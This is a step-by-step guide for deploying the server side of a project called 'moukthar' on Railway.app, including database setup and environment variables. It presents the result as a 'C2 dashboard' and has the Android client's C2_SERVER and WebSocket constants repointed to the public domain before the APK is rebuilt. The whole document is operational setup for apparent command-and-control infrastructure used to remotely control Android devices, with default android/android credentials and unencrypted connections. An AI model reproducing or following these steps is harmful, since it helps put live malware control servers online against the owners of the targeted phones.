# Railway.app - Quick Start (10 Minutes)

## Prerequisites
- ✅ GitHub account with `moukthar` repository
- ✅ Docker files already in Server directory
- ✅ Code already prepared

## Step-by-Step Setup

### 1️⃣ Create Railway Account (2 minutes)

1. Go to **[railway.app](https://railway.app)**
2. Click **Sign Up**
3. Choose **GitHub** authentication
4. Authorize Railway to access your GitHub account
5. Done! ✅

### 2️⃣ Create New Project (1 minute)

1. In Railway dashboard, click **+ New Project**
2. Select **Deploy from GitHub repo**
3. Search for `moukthar`
4. Click to select the repository
5. Click **Deploy Now**

Railway will automatically:
- ✅ Build Dockerfile
- ✅ Create web service
- ✅ Start initial deployment

**Wait for build to complete** (2-3 minutes)

### 3️⃣ Add MySQL Database (1 minute)

1. In your Railway project, click **+ Add**
2. Select **Database** → **MySQL**
3. Wait for database to initialize (~30 seconds)
4. Click on the MySQL service
5. Go to **Variables** tab
6. Note your database credentials:
   - `MYSQL_USER`
   - `MYSQL_PASSWORD`
   - `MYSQL_DATABASE` = `cc`

**Important:** Copy these values - you'll need them in Step 5.

### 4️⃣ Initialize Database (2 minutes)

Railway needs to load your database schema.

**Option A: Using Railway Console (Easiest)**
1. Click on **MySQL** service
2. Go to **Data** tab
3. Click **Console**
4. Copy entire contents of `Server/database.sql`
5. Paste into console
6. Execute

**Option B: Using Railway CLI**
```bash
npm i -g @railway/cli
railway login
railway link
railway exec mysql < Server/database.sql
```

✅ Database is now initialized with your schema

### 5️⃣ Configure Environment Variables (2 minutes)

1. Click on your **GitHub repo service** (the web service)
2. Go to **Variables** tab
3. Add these variables:

```
DB_HOST=mysql
DB_NAME=cc
DB_USER=[your MYSQL_USER from Step 3]
DB_PASSWORD=[your MYSQL_PASSWORD from Step 3]
WEBSOCKET_URI=ws://[your-railway-domain]:8080
```

**How to get your Railway domain:**
1. Click **Settings** tab
2. Look for **Domains** section
3. Your domain is something like: `moukthar-production.railway.app`

So if your domain is `moukthar-production.railway.app`, set:
```
WEBSOCKET_URI=ws://moukthar-production.railway.app:8080
```

### 6️⃣ Deploy (Click Button!)

1. Click **Deploy** or push to GitHub
2. Watch the build progress in **Deployments** tab
3. When status shows **✅ Active**, it's live!

**This will:**
- ✅ Build Docker images
- ✅ Start all 3 services (MySQL, PHP/Apache, WebSocket)
- ✅ Mount volumes correctly
- ✅ Configure networking

### 7️⃣ Test Your Server (1 minute)

1. Get your Railway domain (from Settings → Domains)
2. Open browser: `http://moukthar-production.railway.app`
3. Login with: `android` / `android`
4. You should see the C2 dashboard!

✅ **Server is live!**

### 8️⃣ Update Android Client (2 minutes)

Edit: `Client/app/src/main/java/com/ot/grhq/client/functionality/Utils.java`

Replace:
```java
private static final String C2_SERVER = "http://localhost";
public static final String WEB_SOCKET_SERVER = "ws://localhost:8080";
```

With:
```java
private static final String C2_SERVER = "http://moukthar-production.railway.app";
public static final String WEB_SOCKET_SERVER = "ws://moukthar-production.railway.app:8080";
```

(Use your actual Railway domain, not `moukthar-production`)

### 9️⃣ Rebuild APK

Rebuild your Android APK with the new server configuration and test!

---

## Troubleshooting

### Build Failed
- Check **Deployments** tab
- Click failed build to see error
- Fix error in code
- Push to GitHub to retry

### Can't Access Website
- Verify domain is correct (Settings → Domains)
- Check if service is **Active** in Deployments
- Wait 1-2 minutes and refresh
- Check logs: Click service → **Logs** tab

### Database Not Initializing
- Verify you executed `database.sql`
- Check MySQL service is **Active**
- Try executing SQL again from console
- Check error in MySQL logs

### WebSocket Connection Fails
- Verify `WEBSOCKET_URI` environment variable is set
- Check port 8080 is exposed in Dockerfile
- Check logs for WebSocket errors
- Try accessing `http://domain:8080` directly

---

## Monitoring

### View Logs
1. Click on a service
2. Go to **Logs** tab
3. See real-time logs

### View Metrics
1. Click service
2. Go to **Metrics** tab
3. See CPU, memory, disk usage

### Check Deployment Status
1. Go to **Deployments** tab
2. See current and previous deployments
3. Rollback if needed

---

## Cost Tracking

### Check Your Usage
1. Account menu (top right)
2. **Billing**
3. See remaining credit

### When Credit Runs Out
You'll get a warning. Options:
1. Add payment method ($5-10/month for this app)
2. Migrate to Oracle Cloud (free forever)
3. Migrate to home server (free)

---

## Next Steps

✅ Server deployed on Railway
✅ Accessible at your domain
✅ WebSocket running
✅ Database initialized

**Next:**
1. Update Android client with Railway domain
2. Rebuild APK
3. Test from mobile device
4. Monitor logs for issues

---

## Quick Reference

| Item | Value |
|------|-------|
| **Access** | `http://[your-domain].railway.app` |
| **WebSocket** | `ws://[your-domain].railway.app:8080` |
| **Username** | android |
| **Password** | android |
| **Cost** | Free for 2-3 months |
| **Setup Time** | ~10 minutes |

---

## Need More Help?

- Full guide: [RAILWAY_SETUP.md](RAILWAY_SETUP.md)
- Troubleshooting: See section above
- Comparisons: [FREE_HOSTING_OPTIONS.md](FREE_HOSTING_OPTIONS.md)

---

**You're done! Your server is live on Railway! 🚀**
